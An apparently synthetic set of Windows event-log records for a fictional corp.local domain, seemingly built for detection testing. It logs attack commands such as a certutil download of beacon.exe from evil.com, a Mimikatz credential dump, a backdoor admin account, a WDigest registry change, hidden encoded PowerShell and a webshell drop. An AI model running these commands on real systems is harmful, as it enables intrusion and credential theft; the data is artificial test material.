{"source_type":"winevt_json","@timestamp":"2026-03-14T00:30:00Z","winlog":{"provider_name":"Microsoft-Windows-Security-Auditing","event_id":4624,"channel":"Security","computer_name":"WORKSTATION-01.corp.local","event_data":{"SubjectUserSid":"S-1-5-18","SubjectUserName":"WORKSTATION-01$","SubjectDomainName":"CORP","TargetUserSid":"S-1-5-21-3623811015-3361044348-30300820-1001","TargetUserName":"jsmith","TargetDomainName":"CORP","LogonType":"2","LogonProcessName":"User32","AuthenticationPackageName":"Negotiate","WorkstationName":"WORKSTATION-01","IpAddress":"127.0.0.1","IpPort":"0"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T01:00:00Z","winlog":{"provider_name":"Microsoft-Windows-Security-Auditing","event_id":4624,"channel":"Security","computer_name":"SERVER-DC-01.corp.local","event_data":{"SubjectUserSid":"S-1-5-18","SubjectUserName":"SERVER-DC-01$","SubjectDomainName":"CORP","TargetUserSid":"S-1-5-21-3623811015-3361044348-30300820-500","TargetUserName":"admin","TargetDomainName":"CORP","LogonType":"3","LogonProcessName":"Kerberos","AuthenticationPackageName":"Kerberos","WorkstationName":"-","IpAddress":"192.168.1.102","IpPort":"49400"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T02:00:00Z","winlog":{"provider_name":"Microsoft-Windows-Security-Auditing","event_id":4624,"channel":"Security","computer_name":"WORKSTATION-03.corp.local","event_data":{"SubjectUserSid":"S-1-5-18","SubjectUserName":"WORKSTATION-03$","SubjectDomainName":"CORP","TargetUserSid":"S-1-5-21-3623811015-3361044348-30300820-1003","TargetUserName":"bwilson","TargetDomainName":"CORP","LogonType":"10","LogonProcessName":"User32","AuthenticationPackageName":"Negotiate","WorkstationName":"WORKSTATION-03","IpAddress":"192.168.1.103","IpPort":"51000"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T03:00:00Z","winlog":{"provider_name":"Microsoft-Windows-Security-Auditing","event_id":4624,"channel":"Security","computer_name":"SERVER-DB-01.corp.local","event_data":{"SubjectUserSid":"S-1-5-18","SubjectUserName":"SERVER-DB-01$","SubjectDomainName":"CORP","TargetUserSid":"S-1-5-21-3623811015-3361044348-30300820-1105","TargetUserName":"svc_backup","TargetDomainName":"CORP","LogonType":"3","LogonProcessName":"Kerberos","AuthenticationPackageName":"Kerberos","WorkstationName":"-","IpAddress":"192.168.1.105","IpPort":"49804"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T04:00:00Z","winlog":{"provider_name":"Microsoft-Windows-Security-Auditing","event_id":4624,"channel":"Security","computer_name":"WORKSTATION-05.corp.local","event_data":{"SubjectUserSid":"S-1-5-18","SubjectUserName":"WORKSTATION-05$","SubjectDomainName":"CORP","TargetUserSid":"S-1-5-21-3623811015-3361044348-30300820-1002","TargetUserName":"agarcia","TargetDomainName":"CORP","LogonType":"2","LogonProcessName":"User32","AuthenticationPackageName":"Negotiate","WorkstationName":"WORKSTATION-05","IpAddress":"127.0.0.1","IpPort":"0"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T05:00:00Z","winlog":{"provider_name":"Microsoft-Windows-Security-Auditing","event_id":4625,"channel":"Security","computer_name":"SERVER-DC-01.corp.local","event_data":{"SubjectUserSid":"S-1-0-0","SubjectUserName":"-","SubjectDomainName":"-","TargetUserSid":"S-1-0-0","TargetUserName":"admin","TargetDomainName":"CORP","Status":"0xc000006d","FailureReason":"%%2313","SubStatus":"0xc000006a","LogonType":"3","LogonProcessName":"NtLmSsp","AuthenticationPackageName":"NTLM","WorkstationName":"WORKSTATION-02","IpAddress":"192.168.1.101","IpPort":"50100"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T05:00:05Z","winlog":{"provider_name":"Microsoft-Windows-Security-Auditing","event_id":4625,"channel":"Security","computer_name":"SERVER-DC-01.corp.local","event_data":{"SubjectUserSid":"S-1-0-0","SubjectUserName":"-","SubjectDomainName":"-","TargetUserSid":"S-1-0-0","TargetUserName":"admin","TargetDomainName":"CORP","Status":"0xc000006d","FailureReason":"%%2313","SubStatus":"0xc000006a","LogonType":"3","LogonProcessName":"NtLmSsp","AuthenticationPackageName":"NTLM","WorkstationName":"WORKSTATION-02","IpAddress":"192.168.1.101","IpPort":"50101"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T06:00:00Z","winlog":{"provider_name":"Microsoft-Windows-Security-Auditing","event_id":4625,"channel":"Security","computer_name":"WORKSTATION-01.corp.local","event_data":{"SubjectUserSid":"S-1-0-0","SubjectUserName":"-","SubjectDomainName":"-","TargetUserSid":"S-1-0-0","TargetUserName":"administrator","TargetDomainName":"WORKSTATION-01","Status":"0xc000006d","FailureReason":"%%2313","SubStatus":"0xc0000064","LogonType":"10","LogonProcessName":"User32","AuthenticationPackageName":"Negotiate","WorkstationName":"WORKSTATION-01","IpAddress":"203.0.113.42","IpPort":"44600"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T07:00:00Z","winlog":{"provider_name":"Microsoft-Windows-Security-Auditing","event_id":4625,"channel":"Security","computer_name":"SERVER-WEB-01.corp.local","event_data":{"SubjectUserSid":"S-1-0-0","SubjectUserName":"-","SubjectDomainName":"-","TargetUserSid":"S-1-0-0","TargetUserName":"root","TargetDomainName":"SERVER-WEB-01","Status":"0xc000006d","FailureReason":"%%2313","SubStatus":"0xc0000064","LogonType":"3","LogonProcessName":"NtLmSsp","AuthenticationPackageName":"NTLM","WorkstationName":"-","IpAddress":"203.0.113.99","IpPort":"44400"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T08:00:00Z","winlog":{"provider_name":"Microsoft-Windows-Security-Auditing","event_id":4625,"channel":"Security","computer_name":"WORKSTATION-04.corp.local","event_data":{"SubjectUserSid":"S-1-0-0","SubjectUserName":"-","SubjectDomainName":"-","TargetUserSid":"S-1-0-0","TargetUserName":"agarcia","TargetDomainName":"CORP","Status":"0xc000006d","FailureReason":"%%2313","SubStatus":"0xc000006a","LogonType":"2","LogonProcessName":"User32","AuthenticationPackageName":"Negotiate","WorkstationName":"WORKSTATION-04","IpAddress":"127.0.0.1","IpPort":"0"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T09:00:00Z","winlog":{"provider_name":"Microsoft-Windows-Security-Auditing","event_id":4688,"channel":"Security","computer_name":"WORKSTATION-01.corp.local","event_data":{"SubjectUserSid":"S-1-5-21-3623811015-3361044348-30300820-1001","SubjectUserName":"jsmith","SubjectDomainName":"CORP","NewProcessId":"0x1234","NewProcessName":"C:\\Windows\\System32\\cmd.exe","TokenElevationType":"%%1936","ProcessId":"0x0ABC","CommandLine":"cmd.exe /c ipconfig /all","ParentProcessName":"C:\\Windows\\explorer.exe"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T10:00:00Z","winlog":{"provider_name":"Microsoft-Windows-Security-Auditing","event_id":4688,"channel":"Security","computer_name":"WORKSTATION-02.corp.local","event_data":{"SubjectUserSid":"S-1-5-21-3623811015-3361044348-30300820-1001","SubjectUserName":"jsmith","SubjectDomainName":"CORP","NewProcessId":"0x1A20","NewProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","TokenElevationType":"%%1937","ProcessId":"0x0FAC","CommandLine":"powershell.exe -nop -w hidden -enc aQBlAHgA","ParentProcessName":"C:\\Windows\\System32\\cmd.exe"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T11:00:00Z","winlog":{"provider_name":"Microsoft-Windows-Security-Auditing","event_id":4688,"channel":"Security","computer_name":"SERVER-DC-01.corp.local","event_data":{"SubjectUserSid":"S-1-5-21-3623811015-3361044348-30300820-500","SubjectUserName":"admin","SubjectDomainName":"CORP","NewProcessId":"0x32C8","NewProcessName":"C:\\Windows\\System32\\ntdsutil.exe","TokenElevationType":"%%1937","ProcessId":"0x0378","CommandLine":"ntdsutil.exe","ParentProcessName":"C:\\Windows\\System32\\cmd.exe"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T12:00:00Z","winlog":{"provider_name":"Microsoft-Windows-Security-Auditing","event_id":4688,"channel":"Security","computer_name":"WORKSTATION-03.corp.local","event_data":{"SubjectUserSid":"S-1-5-21-3623811015-3361044348-30300820-1003","SubjectUserName":"bwilson","SubjectDomainName":"CORP","NewProcessId":"0x26AC","NewProcessName":"C:\\Windows\\System32\\cmd.exe","TokenElevationType":"%%1937","ProcessId":"0x26A4","CommandLine":"cmd.exe /c net user admin Password123 /add","ParentProcessName":"C:\\Users\\bwilson\\Downloads\\installer.exe"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T13:00:00Z","winlog":{"provider_name":"Microsoft-Windows-Security-Auditing","event_id":4688,"channel":"Security","computer_name":"SERVER-WEB-01.corp.local","event_data":{"SubjectUserSid":"S-1-5-82-1","SubjectUserName":"IIS_IUSRS","SubjectDomainName":"IIS APPPOOL","NewProcessId":"0x2EE0","NewProcessName":"C:\\Windows\\System32\\cmd.exe","TokenElevationType":"%%1936","ProcessId":"0x0CE4","CommandLine":"cmd.exe /c whoami","ParentProcessName":"C:\\inetpub\\wwwroot\\app\\w3wp.exe"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T14:00:00Z","winlog":{"provider_name":"Microsoft-Windows-Security-Auditing","event_id":4688,"channel":"Security","computer_name":"WORKSTATION-04.corp.local","event_data":{"SubjectUserSid":"S-1-5-21-3623811015-3361044348-30300820-1002","SubjectUserName":"agarcia","SubjectDomainName":"CORP","NewProcessId":"0x1E14","NewProcessName":"C:\\Users\\agarcia\\Downloads\\mimikatz.exe","TokenElevationType":"%%1937","ProcessId":"0x19CC","CommandLine":"mimikatz.exe privilege::debug sekurlsa::logonpasswords","ParentProcessName":"C:\\Windows\\System32\\cmd.exe"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T15:00:00Z","winlog":{"provider_name":"Microsoft-Windows-Security-Auditing","event_id":4688,"channel":"Security","computer_name":"WORKSTATION-02.corp.local","event_data":{"SubjectUserSid":"S-1-5-21-3623811015-3361044348-30300820-1001","SubjectUserName":"jsmith","SubjectDomainName":"CORP","NewProcessId":"0x3A98","NewProcessName":"C:\\Windows\\System32\\certutil.exe","TokenElevationType":"%%1936","ProcessId":"0x1A20","CommandLine":"certutil.exe -urlcache -split -f http://evil.com/beacon.exe C:\\temp\\beacon.exe","ParentProcessName":"C:\\Users\\jsmith\\AppData\\Local\\Temp\\payload.exe"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T16:00:00Z","winlog":{"provider_name":"Microsoft-Windows-Security-Auditing","event_id":4688,"channel":"Security","computer_name":"SERVER-DB-01.corp.local","event_data":{"SubjectUserSid":"S-1-5-80-1","SubjectUserName":"MSSQLSERVER","SubjectDomainName":"NT SERVICE","NewProcessId":"0x36B0","NewProcessName":"C:\\Windows\\System32\\cmd.exe","TokenElevationType":"%%1936","ProcessId":"0x157C","CommandLine":"cmd.exe /c bcp \"SELECT * FROM users\" queryout C:\\temp\\users.csv /c /S localhost","ParentProcessName":"C:\\Program Files\\Microsoft SQL Server\\MSSQL16\\MSSQL\\Binn\\sqlservr.exe"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T17:00:00Z","winlog":{"provider_name":"Microsoft-Windows-Security-Auditing","event_id":4688,"channel":"Security","computer_name":"WORKSTATION-05.corp.local","event_data":{"SubjectUserSid":"S-1-5-21-3623811015-3361044348-30300820-1002","SubjectUserName":"agarcia","SubjectDomainName":"CORP","NewProcessId":"0x0834","NewProcessName":"C:\\Windows\\System32\\notepad.exe","TokenElevationType":"%%1936","ProcessId":"0x044C","CommandLine":"notepad.exe","ParentProcessName":"C:\\Windows\\explorer.exe"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T01:30:00Z","winlog":{"provider_name":"Microsoft-Windows-Security-Auditing","event_id":4768,"channel":"Security","computer_name":"SERVER-DC-01.corp.local","event_data":{"TargetUserName":"jsmith","TargetDomainName":"CORP.LOCAL","TargetSid":"S-1-5-21-3623811015-3361044348-30300820-1001","ServiceName":"krbtgt","TicketOptions":"0x40810010","Status":"0x0","TicketEncryptionType":"0x12","PreAuthType":"15","IpAddress":"::ffff:192.168.1.100","IpPort":"49600"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T03:30:00Z","winlog":{"provider_name":"Microsoft-Windows-Security-Auditing","event_id":4768,"channel":"Security","computer_name":"SERVER-DC-01.corp.local","event_data":{"TargetUserName":"agarcia","TargetDomainName":"CORP.LOCAL","TargetSid":"S-1-5-21-3623811015-3361044348-30300820-1002","ServiceName":"krbtgt","TicketOptions":"0x40810010","Status":"0x0","TicketEncryptionType":"0x12","PreAuthType":"15","IpAddress":"::ffff:192.168.1.104","IpPort":"49603"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T05:30:00Z","winlog":{"provider_name":"Microsoft-Windows-Security-Auditing","event_id":4768,"channel":"Security","computer_name":"SERVER-DC-01.corp.local","event_data":{"TargetUserName":"bwilson","TargetDomainName":"CORP.LOCAL","TargetSid":"S-1-5-21-3623811015-3361044348-30300820-1003","ServiceName":"krbtgt","TicketOptions":"0x40810010","Status":"0x0","TicketEncryptionType":"0x12","PreAuthType":"15","IpAddress":"::ffff:192.168.1.103","IpPort":"49605"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T07:30:00Z","winlog":{"provider_name":"Microsoft-Windows-Security-Auditing","event_id":4768,"channel":"Security","computer_name":"SERVER-DC-01.corp.local","event_data":{"TargetUserName":"nonexistent","TargetDomainName":"CORP.LOCAL","TargetSid":"S-1-0-0","ServiceName":"krbtgt","TicketOptions":"0x40810010","Status":"0x6","TicketEncryptionType":"0xffffffff","PreAuthType":"0","IpAddress":"::ffff:192.168.1.101","IpPort":"49650"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T02:30:00Z","winlog":{"provider_name":"Microsoft-Windows-Security-Auditing","event_id":4769,"channel":"Security","computer_name":"SERVER-DC-01.corp.local","event_data":{"TargetUserName":"jsmith@CORP.LOCAL","TargetDomainName":"CORP.LOCAL","ServiceName":"cifs/DC01.CORP.LOCAL","TicketOptions":"0x40810000","TicketEncryptionType":"0x12","IpAddress":"::ffff:192.168.1.101","IpPort":"49601","Status":"0x0"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T04:30:00Z","winlog":{"provider_name":"Microsoft-Windows-Security-Auditing","event_id":4769,"channel":"Security","computer_name":"SERVER-DC-01.corp.local","event_data":{"TargetUserName":"jsmith@CORP.LOCAL","TargetDomainName":"CORP.LOCAL","ServiceName":"MSSQLSvc/DB01.CORP.LOCAL:1433","TicketOptions":"0x40810000","TicketEncryptionType":"0x17","IpAddress":"::ffff:192.168.1.101","IpPort":"49602","Status":"0x0"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T06:30:00Z","winlog":{"provider_name":"Microsoft-Windows-Security-Auditing","event_id":4769,"channel":"Security","computer_name":"SERVER-DC-01.corp.local","event_data":{"TargetUserName":"admin@CORP.LOCAL","TargetDomainName":"CORP.LOCAL","ServiceName":"krbtgt/CORP.LOCAL","TicketOptions":"0x40810000","TicketEncryptionType":"0x17","IpAddress":"::ffff:192.168.1.102","IpPort":"49604","Status":"0x0"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T08:30:00Z","winlog":{"provider_name":"Microsoft-Windows-Security-Auditing","event_id":4769,"channel":"Security","computer_name":"SERVER-DC-01.corp.local","event_data":{"TargetUserName":"svc_backup@CORP.LOCAL","TargetDomainName":"CORP.LOCAL","ServiceName":"cifs/DB01.CORP.LOCAL","TicketOptions":"0x40810000","TicketEncryptionType":"0x12","IpAddress":"::ffff:192.168.1.105","IpPort":"49609","Status":"0x0"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T09:30:00Z","winlog":{"provider_name":"System","event_id":7045,"channel":"System","computer_name":"WORKSTATION-03.corp.local","event_data":{"ServiceName":"MaliciousService","ImagePath":"C:\\Users\\bwilson\\Downloads\\backdoor.exe","ServiceType":"user mode service","StartType":"auto start","AccountName":"LocalSystem"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T10:30:00Z","winlog":{"provider_name":"System","event_id":7045,"channel":"System","computer_name":"SERVER-DC-01.corp.local","event_data":{"ServiceName":"WindowsUpdateHelper","ImagePath":"C:\\Windows\\Temp\\svc_update.exe","ServiceType":"user mode service","StartType":"auto start","AccountName":"LocalSystem"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T11:30:00Z","winlog":{"provider_name":"System","event_id":7045,"channel":"System","computer_name":"WORKSTATION-01.corp.local","event_data":{"ServiceName":"SentinelAgent","ImagePath":"C:\\Program Files\\Sentinel\\SentinelAgent.exe","ServiceType":"user mode service","StartType":"auto start","AccountName":"LocalSystem"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T12:30:00Z","winlog":{"provider_name":"Microsoft-Windows-Sysmon","event_id":1,"channel":"Microsoft-Windows-Sysmon/Operational","computer_name":"WORKSTATION-01.corp.local","event_data":{"RuleName":"technique_id=T1059.001","UtcTime":"2026-03-14 12:30:00.000","ProcessId":"8800","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell.exe -nop -w hidden -enc aQBlAHgA","CurrentDirectory":"C:\\Users\\jsmith\\","User":"CORP\\jsmith","IntegrityLevel":"Medium","Hashes":"SHA256=ABC123DEF456789","ParentProcessId":"4012","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd.exe"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T13:30:00Z","winlog":{"provider_name":"Microsoft-Windows-Sysmon","event_id":1,"channel":"Microsoft-Windows-Sysmon/Operational","computer_name":"WORKSTATION-04.corp.local","event_data":{"RuleName":"-","UtcTime":"2026-03-14 13:30:00.000","ProcessId":"7700","Image":"C:\\Users\\agarcia\\Downloads\\mimikatz.exe","CommandLine":"mimikatz.exe privilege::debug sekurlsa::logonpasswords","CurrentDirectory":"C:\\Users\\agarcia\\Downloads\\","User":"CORP\\agarcia","IntegrityLevel":"High","Hashes":"SHA256=GHI789JKL012345","ParentProcessId":"6600","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd.exe"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T14:30:00Z","winlog":{"provider_name":"Microsoft-Windows-Sysmon","event_id":3,"channel":"Microsoft-Windows-Sysmon/Operational","computer_name":"WORKSTATION-02.corp.local","event_data":{"RuleName":"technique_id=T1071","UtcTime":"2026-03-14 14:30:00.000","ProcessId":"6688","Image":"C:\\Users\\jsmith\\AppData\\Local\\Temp\\payload.exe","User":"CORP\\jsmith","Protocol":"tcp","Initiated":"true","SourceIp":"192.168.1.101","SourcePort":"50000","DestinationIp":"185.220.101.45","DestinationPort":"4444"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T15:30:00Z","winlog":{"provider_name":"Microsoft-Windows-Sysmon","event_id":3,"channel":"Microsoft-Windows-Sysmon/Operational","computer_name":"WORKSTATION-01.corp.local","event_data":{"RuleName":"-","UtcTime":"2026-03-14 15:30:00.000","ProcessId":"1500","Image":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","User":"CORP\\jsmith","Protocol":"tcp","Initiated":"true","SourceIp":"192.168.1.100","SourcePort":"52100","DestinationIp":"142.250.80.46","DestinationPort":"443"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T16:30:00Z","winlog":{"provider_name":"Microsoft-Windows-Sysmon","event_id":3,"channel":"Microsoft-Windows-Sysmon/Operational","computer_name":"SERVER-DB-01.corp.local","event_data":{"RuleName":"technique_id=T1041","UtcTime":"2026-03-14 16:30:00.000","ProcessId":"5500","Image":"C:\\Program Files\\Microsoft SQL Server\\MSSQL16\\MSSQL\\Binn\\sqlservr.exe","User":"NT SERVICE\\MSSQLSERVER","Protocol":"tcp","Initiated":"true","SourceIp":"10.0.0.30","SourcePort":"1433","DestinationIp":"185.220.101.45","DestinationPort":"443"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T17:30:00Z","winlog":{"provider_name":"Microsoft-Windows-Sysmon","event_id":11,"channel":"Microsoft-Windows-Sysmon/Operational","computer_name":"WORKSTATION-02.corp.local","event_data":{"RuleName":"-","UtcTime":"2026-03-14 17:30:00.000","ProcessId":"6688","Image":"C:\\Users\\jsmith\\AppData\\Local\\Temp\\payload.exe","TargetFilename":"C:\\Windows\\System32\\drivers\\malicious.sys","CreationUtcTime":"2026-03-14 17:30:00.000"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T18:30:00Z","winlog":{"provider_name":"Microsoft-Windows-Sysmon","event_id":11,"channel":"Microsoft-Windows-Sysmon/Operational","computer_name":"SERVER-WEB-01.corp.local","event_data":{"RuleName":"technique_id=T1505.003","UtcTime":"2026-03-14 18:30:00.000","ProcessId":"3300","Image":"C:\\inetpub\\wwwroot\\app\\w3wp.exe","TargetFilename":"C:\\inetpub\\wwwroot\\uploads\\webshell.aspx","CreationUtcTime":"2026-03-14 18:30:00.000"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T19:30:00Z","winlog":{"provider_name":"Microsoft-Windows-Sysmon","event_id":11,"channel":"Microsoft-Windows-Sysmon/Operational","computer_name":"WORKSTATION-05.corp.local","event_data":{"RuleName":"-","UtcTime":"2026-03-14 19:30:00.000","ProcessId":"7788","Image":"C:\\Windows\\System32\\wscript.exe","TargetFilename":"C:\\Users\\agarcia\\Documents\\important.docx.encrypted","CreationUtcTime":"2026-03-14 19:30:00.000"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T20:30:00Z","winlog":{"provider_name":"Microsoft-Windows-Security-Auditing","event_id":4624,"channel":"Security","computer_name":"SERVER-DC-01.corp.local","event_data":{"SubjectUserSid":"S-1-5-18","SubjectUserName":"SERVER-DC-01$","SubjectDomainName":"CORP","TargetUserSid":"S-1-5-21-3623811015-3361044348-30300820-1002","TargetUserName":"agarcia","TargetDomainName":"CORP","LogonType":"10","LogonProcessName":"User32","AuthenticationPackageName":"Negotiate","WorkstationName":"WORKSTATION-04","IpAddress":"192.168.1.104","IpPort":"49405"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T21:30:00Z","winlog":{"provider_name":"Microsoft-Windows-Security-Auditing","event_id":4688,"channel":"Security","computer_name":"WORKSTATION-02.corp.local","event_data":{"SubjectUserSid":"S-1-5-21-3623811015-3361044348-30300820-1001","SubjectUserName":"jsmith","SubjectDomainName":"CORP","NewProcessId":"0x2B04","NewProcessName":"C:\\Windows\\System32\\reg.exe","TokenElevationType":"%%1937","ProcessId":"0x1A20","CommandLine":"reg.exe add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f","ParentProcessName":"C:\\Users\\jsmith\\AppData\\Local\\Temp\\payload.exe"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T22:30:00Z","winlog":{"provider_name":"System","event_id":7045,"channel":"System","computer_name":"WORKSTATION-04.corp.local","event_data":{"ServiceName":"RemoteAccessSvc","ImagePath":"cmd.exe /c powershell.exe -ep bypass -e aQBlAHgA","ServiceType":"user mode service","StartType":"demand start","AccountName":"LocalSystem"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T23:00:00Z","winlog":{"provider_name":"Microsoft-Windows-Sysmon","event_id":1,"channel":"Microsoft-Windows-Sysmon/Operational","computer_name":"SERVER-WEB-01.corp.local","event_data":{"RuleName":"technique_id=T1059.003","UtcTime":"2026-03-14 23:00:00.000","ProcessId":"12000","Image":"C:\\Windows\\System32\\cmd.exe","CommandLine":"cmd.exe /c whoami /priv > C:\\inetpub\\temp\\privs.txt","CurrentDirectory":"C:\\inetpub\\wwwroot\\","User":"IIS APPPOOL\\DefaultAppPool","IntegrityLevel":"Medium","Hashes":"SHA256=YZA234BCD567890","ParentProcessId":"3300","ParentImage":"C:\\inetpub\\wwwroot\\app\\w3wp.exe","ParentCommandLine":"w3wp.exe"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T23:30:00Z","winlog":{"provider_name":"Microsoft-Windows-Sysmon","event_id":11,"channel":"Microsoft-Windows-Sysmon/Operational","computer_name":"WORKSTATION-03.corp.local","event_data":{"RuleName":"-","UtcTime":"2026-03-14 23:30:00.000","ProcessId":"9900","Image":"C:\\Users\\bwilson\\Downloads\\installer.exe","TargetFilename":"C:\\Users\\bwilson\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\persist.exe","CreationUtcTime":"2026-03-14 23:30:00.000"}}}
{"source_type":"winevt_json","@timestamp":"2026-03-14T23:45:00Z","winlog":{"provider_name":"Microsoft-Windows-Security-Auditing","event_id":4768,"channel":"Security","computer_name":"SERVER-DC-01.corp.local","event_data":{"TargetUserName":"svc_backup","TargetDomainName":"CORP.LOCAL","TargetSid":"S-1-5-21-3623811015-3361044348-30300820-1105","ServiceName":"krbtgt","TicketOptions":"0x40810010","Status":"0x0","TicketEncryptionType":"0x12","PreAuthType":"15","IpAddress":"::ffff:192.168.1.105","IpPort":"49607"}}}